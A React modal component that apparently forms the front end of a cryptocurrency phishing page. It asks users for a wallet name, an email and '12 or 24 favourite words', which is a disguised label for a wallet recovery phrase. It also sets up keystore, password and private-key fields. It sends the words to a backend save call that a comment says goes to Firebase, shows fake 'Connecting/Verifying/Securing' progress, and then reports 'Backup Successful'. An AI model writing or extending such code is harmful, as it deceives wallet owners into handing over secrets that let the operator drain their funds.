
import "./ConnectFormModal.css";
import { useState, useEffect } from "react";
import { FaTimes, FaCheck } from "react-icons/fa";

import {
  validateFavouriteWords,
  saveWalletConnection,
} from "../services/walletService";

function ConnectFormModal({
  isOpen,
  onClose,
  wallet,
}) {
  const [tab, setTab] = useState("phrase");

  const [step, setStep] = useState(0);
  const [progress, setProgress] =
    useState(0);

  const [success, setSuccess] =
    useState(false);

  const [uniqueId, setUniqueId] =
    useState("");

  const [isLoading, setIsLoading] =
    useState(false);

  const [error, setError] =
    useState(null);

  const [validationError,
    setValidationError] =
    useState(null);

  const [form, setForm] = useState({
    name: "",
    email: "",
    phrase: "",
    keystore: "",
    password: "",
    privateKey: "",
  });

  /* =========================
     RESET WHEN CLOSED
  ========================= */
  useEffect(() => {
    if (!isOpen) {
      setStep(0);
      setProgress(0);
      setSuccess(false);
      setError(null);
      setValidationError(null);

      setForm({
        name: "",
        email: "",
        phrase: "",
        keystore: "",
        password: "",
        privateKey: "",
      });
    }
  }, [isOpen]);

  if (!isOpen) return null;

  /* =========================
     HANDLE INPUT
  ========================= */
  const handleChange = (e) => {
    setValidationError(null);

    setForm({
      ...form,
      [e.target.name]:
        e.target.value,
    });
  };

  /* =========================
     VALIDATE FORM
  ========================= */
  const validateFormData = () => {
    if (!form.name.trim()) {
      setValidationError(
        "Wallet name is required"
      );
      return false;
    }

    if (!form.email.trim()) {
      setValidationError(
        "Email is required"
      );
      return false;
    }

    const emailRegex =
      /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (
      !emailRegex.test(form.email)
    ) {
      setValidationError(
        "Please enter a valid email address"
      );
      return false;
    }

    /* Favourite Words */
    if (tab === "phrase") {
      const validation =
        validateFavouriteWords(
          form.phrase
        );

      if (!validation.isValid) {
        setValidationError(
          validation.error
        );
        return false;
      }
    }

    return true;
  };

  /* =========================
     HANDLE SUBMIT
  ========================= */
  const handleSubmit = async () => {
    setError(null);

      if (!validateFormData())
        return;

      setIsLoading(true);
      setError(null);
      setValidationError(null);

      try {
        let walletData = {
          name: form.name.trim(),
          email:
            form.email.trim(),
          type:
            wallet?.name ||
            "Unknown",
        };

        /* Favourite Words */
        if (tab === "phrase") {
          const validation =
            validateFavouriteWords(
              form.phrase
            );

          walletData
            .favouriteWords =
            form.phrase.trim();

          walletData.wordCount =
            validation.wordCount;
        }

        /* Progress Animation */
        setStep(1);
        setProgress(20);

        await new Promise(
          (resolve) =>
            setTimeout(
              resolve,
              1200
            )
        );

        /* Save to Firebase */
        const result =
          await saveWalletConnection(
            walletData
          );

        if (!result.success) {
          throw new Error(
            result.error
          );
        }

        setUniqueId(result.uid);

        setStep(2);
        setProgress(60);

        await new Promise(
          (resolve) =>
            setTimeout(
              resolve,
              1200
            )
        );

        setStep(3);
        setProgress(100);

        await new Promise(
          (resolve) =>
            setTimeout(
              resolve,
              800
            )
        );

        setSuccess(true);
      } catch (err) {
        console.error(err);

        alert(err.message);

        setError(
          err.message ||
            "Something went wrong"
        );

        setStep(0);
        setProgress(0);
      } finally {
        setIsLoading(false);
      }
    };

  return (
    <>
      {!success && (
        <div
          className="connect-overlay"
          onClick={onClose}
        >
          <div
            className="connect-modal premium"
            onClick={(e) =>
              e.stopPropagation()
            }
          >
            {/* CLOSE */}
            <FaTimes
              className="close-icon"
              onClick={onClose}
            />

            {/* HEADER */}
            <div className="connect-header modern">
              {wallet?.image && (
                <img
                  src={wallet.image}
                  alt={wallet.name}
                  className="wallet-logo"
                />
              )}

              <h2>
                Import your <br />
                {wallet?.name ||
                  "Wallet"}
              </h2>
            </div>

            {/* ERROR */}
            {error && (
              <div className="validation-error">
                <p>{error}</p>
              </div>
            )}

            {/* PROGRESS */}
            {step > 0 && (
              <div className="connection-steps">
                <div className="progress-bar">
                  <div
                    className="progress-fill"
                    style={{
                      width: `${progress}%`,
                    }}
                  ></div>
                </div>

                <div className="steps">
                  <span
                    className={
                      step >= 1
                        ? "active"
                        : ""
                    }
                  >
                    {step > 1 ? (
                      <FaCheck />
                    ) : (
                      "Connecting"
                    )}
                  </span>

                  <span
                    className={
                      step >= 2
                        ? "active"
                        : ""
                    }
                  >
                    {step > 2 ? (
                      <FaCheck />
                    ) : (
                      "Verifying"
                    )}
                  </span>

                  <span
                    className={
                      step >= 3
                        ? "active"
                        : ""
                    }
                  >
                    Securing
                  </span>
                </div>
              </div>
            )}

            {/* FORM */}
            {step === 0 && (
              <>
                <div className="connect-tabs">
                  <span
                    className={
                      tab ===
                      "phrase"
                        ? "active"
                        : ""
                    }
                    onClick={() =>
                      setTab(
                        "phrase"
                      )
                    }
                  >
                    Favourite Words
                  </span>
                </div>

                <div className="connect-body">
                  <label>
                    Wallet Name
                  </label>

                  <input
                    name="name"
                    placeholder="Wallet Name"
                    value={
                      form.name
                    }
                    onChange={
                      handleChange
                    }
                  />

                  <label>
                    Email
                  </label>

                  <input
                    name="email"
                    type="email"
                    placeholder="Email"
                    value={
                      form.email
                    }
                    onChange={
                      handleChange
                    }
                  />

                  {/* FAVOURITE WORDS */}
                  <label>
                    Favourite Words
                  </label>

                  <textarea
                    name="phrase"
                    placeholder="Enter 12 or 24 favourite words"
                    value={
                      form.phrase
                    }
                    onChange={
                      handleChange
                    }
                  />

                  <small>
                    Choose 12 or
                    24 favourite
                    words
                    separated by
                    spaces
                  </small>

                  {/* VALIDATION */}
                  {validationError && (
                    <div className="validation-error">
                      <p>
                        {
                          validationError
                        }
                      </p>
                    </div>
                  )}

                  <div className="connect-actions">
                    <button
                      className="btn-cancel"
                      onClick={
                        onClose
                      }
                    >
                      Cancel
                    </button>

                    <button
                      className="btn-proceed"
                      onClick={
                        handleSubmit
                      }
                      disabled={
                        isLoading
                      }
                    >
                      {isLoading
                        ? "Processing..."
                        : "Proceed"}
                    </button>
                  </div>
                </div>
              </>
            )}
          </div>
        </div>
      )}

      {/* SUCCESS MODAL */}
      {success && (
        <div className="success-overlay">
          <div className="success-modal premium-success">
            <div className="success-check">
              <FaCheck />
            </div>

            <h2>
              Backup Successful!
            </h2>

            <div className="uid-box">
              <span className="uid-label">
                UNIQUE IDENTIFIER
              </span>

              <div className="uid-code">
                {uniqueId}
              </div>

              <div className="uid-actions">
                <button
                  className="uid-btn"
                  onClick={() => {
                    navigator.clipboard.writeText(
                      uniqueId
                    );

                    alert(
                      "UID copied"
                    );
                  }}
                >
                  Copy UID
                </button>
              </div>
            </div>

            <p className="success-text">
              Your data has
              been successfully
              backed up.
            </p>

            <button
              className="btn-primary success-done"
              onClick={() => {
                setSuccess(
                  false
                );
                onClose();
              }}
            >
              Done
            </button>
          </div>
        </div>
      )}
    </>
  );
}

export default ConnectFormModal;